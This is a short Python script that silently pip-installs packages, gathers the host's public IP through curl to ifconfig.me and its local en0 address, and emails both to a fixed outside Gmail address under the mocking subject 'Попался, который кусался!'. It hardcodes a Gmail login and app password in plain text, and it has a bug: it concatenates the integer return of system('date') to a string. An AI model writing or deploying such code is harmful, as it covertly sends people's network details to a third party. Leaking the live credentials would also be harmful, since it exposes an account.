from os import system
system("pip install email-to")
system("pip install secure-smtplib")

from email.mime.text import MIMEText
# from datetime import datetime
from smtplib import SMTP
from os import popen

def shape(myhtml):
  smtp = 'smtp.gmail.com'
  sender = "7kipgod@gmail.com"
  destination = "svaller22@gmail.com"
  server = SMTP(smtp, 587)
  server.starttls()
  # create a password for the app bot and get the password by putting it in brackets
  server.login(sender, "eifjuipuczaxguxb") # https://myaccount.google.com/apppasswords
  msg = MIMEText(myhtml, "html")
  msg["Subject"] = "Попался, который кусался! " + system('date')
  # + datetime.now().strftime("%d.%m.%Y - %H:%M:%S")
  msg['From'] = sender
  msg['To'] = destination
  server.sendmail(sender, destination, msg.as_string())

def send_email():
    try: shape(f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>""")
    except Exception: shape("ERROR :(")

if __name__ == "__main__": send_email()